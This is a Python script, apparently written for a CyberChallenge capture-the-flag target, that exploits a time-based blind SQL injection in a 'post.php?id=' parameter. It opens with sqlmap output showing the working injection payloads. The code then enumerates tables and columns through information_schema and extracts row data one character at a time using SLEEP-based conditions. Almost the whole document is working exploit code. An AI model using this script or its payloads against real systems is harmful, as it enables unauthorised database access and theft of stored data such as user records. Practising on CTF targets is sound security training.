# the url is vulnerable
"""
[12:26:21] [INFO] checking if the injection point on GET parameter 'id' is a false positive
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
sqlmap identified the following injection point(s) with a total of 315 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
    Payload: id=-5918' OR 7101=7101#

    Type: time-based blind
    Title: MySQL >= 5.0.12 OR time-based blind (query SLEEP)
    Payload: id=1' OR (SELECT 6966 FROM (SELECT(SLEEP(5)))liLi)-- btkv
---

"""
import requests
import time
import string

# Target URL with vulnerable parameter
base_url = "http://filtered.challs.cyberchallenge.it/post.php?id="

# Characters to try when brute-forcing table names
CHARSET = [x for x in string.ascii_lowercase + string.digits] + ['\\_']
COL_CHARSET = CHARSET + [x for x in string.ascii_uppercase]


def test_injection(sql_condition, sleep_time=2):
    """
    Performs a time-based blind SQL injection test
    Returns True if the query causes a delay (meaning the condition is TRUE)
    """
    # Use the payload format identified by sqlmap
    payload = f"1' OR (SELECT IF({sql_condition}, SLEEP({sleep_time}), 0))-- -"
    full_url = base_url + payload

    print(f"Testing: {full_url}")

    start_time = time.time()
    response = requests.get(full_url)
    elapsed_time = time.time() - start_time

    # If the request takes more than sleep_time*0.8 seconds, we assume the condition was TRUE
    return elapsed_time > (sleep_time * 0.8)


def find_table_names_recursive(prefix="", max_depth=15):
    """
    Recursively find table names by building them character by character
    """
    if len(prefix) >= max_depth:
        return [prefix]

    found_tables = []

    # Check if this prefix is a complete table name
    if prefix:
        is_complete_table = test_injection(
            f"EXISTS(SELECT 1 FROM information_schema.tables WHERE table_name = '{prefix}')")
        if is_complete_table:
            print(f"[+] Found complete table: '{prefix}'")
            found_tables.append(prefix)
            # Don't return yet - table could be a prefix of another table

    # Try extending the prefix with each possible character
    for char in CHARSET:
        new_prefix = prefix + char

        # Check if any tables begin with this prefix
        sql_check = f"EXISTS(SELECT 1 FROM information_schema.tables WHERE table_name LIKE '{
            new_prefix}%')"

        if test_injection(sql_check):
            print(f"[+] Found prefix: '{new_prefix}'")
            # Recursively continue with this successful prefix
            found_tables.extend(
                find_table_names_recursive(new_prefix, max_depth))

    return found_tables


def enumerate_columns(table_name):
    """
    Find all column names for a given table
    """
    columns = []

    # First check if table exists
    if not test_injection(f"EXISTS(SELECT 1 FROM information_schema.tables WHERE table_name = '{table_name}')"):
        print(f"[-] Table '{table_name}' does not exist")
        return columns

    print(f"[+] Enumerating columns for table '{table_name}'")

    # Find column names using similar recursive approach as table names
    def find_columns_recursive(prefix=""):
        found_columns = []

        # Check if this prefix is a complete column name
        if prefix:
            is_complete = test_injection(f"EXISTS(SELECT 1 FROM information_schema.columns WHERE table_name = '{
                                         table_name}' AND column_name = '{prefix}')")
            if is_complete:
                print(f"[+] Found column: '{prefix}'")
                found_columns.append(prefix)

        # Try extending the prefix with each possible character
        for char in COL_CHARSET:
            new_prefix = prefix + char
            sql_check = f"EXISTS(SELECT 1 FROM information_schema.columns WHERE table_name = '{
                table_name}' AND column_name LIKE '{new_prefix}%')"

            if test_injection(sql_check):
                print(f"[+] Found column prefix: '{new_prefix}'")
                found_columns.extend(find_columns_recursive(new_prefix))

        return found_columns

    return find_columns_recursive()


def extract_data(table_name, column_names):
    """
    Extract data from specified table and columns
    """
    data = []

    # Determine number of rows
    row_count = 0
    while True:
        if test_injection(f"(SELECT COUNT(*) FROM {table_name}) > {row_count}"):
            row_count += 1
        else:
            break

    print(f"[+] Found {row_count} rows in {table_name}")

    # Extract data for each row
    for row_index in range(row_count):
        row_data = {}
        for column in column_names:
            # Extract data character by character
            value = extract_string(f"SELECT {column} FROM {
                                   table_name} LIMIT {row_index},1")
            row_data[column] = value
        data.append(row_data)
        print(f"[+] Row {row_index + 1}: {row_data}")

    return data


def extract_string(query, max_length=50):
    """
    Extract a string value from the database character by character
    """
    result = ""
    for pos in range(1, max_length + 1):
        found = False
        for char in string.printable:
            # Check if character at position matches
            condition = f"SUBSTRING(({query}), {pos}, 1) = '{char}'"
            if test_injection(condition):
                result += char
                found = True
                print(f"[+] Found character at position {pos}: '{char}'")
                break

        if not found:
            break

    return result


def main():
    print("[*] Starting SQL injection exploration...")

    # Find all table names
    print("[*] Attempting to enumerate table names...")
    # tables = find_table_names_recursive()
    tables = ['flaggy', 'global_status',
              'global_variables', 'persisted_variables', 'users']
    print(f"[+] Found tables: {tables}")

    # For each table, find columns and extract data
    for table in tables:
        columns = enumerate_columns(table)
        print(f"[+] Columns in {table}: {columns}")

        if columns:
            data = extract_data(table, columns)
            print(f"[+] Data from {table}: {data}")


if __name__ == "__main__":
    main()
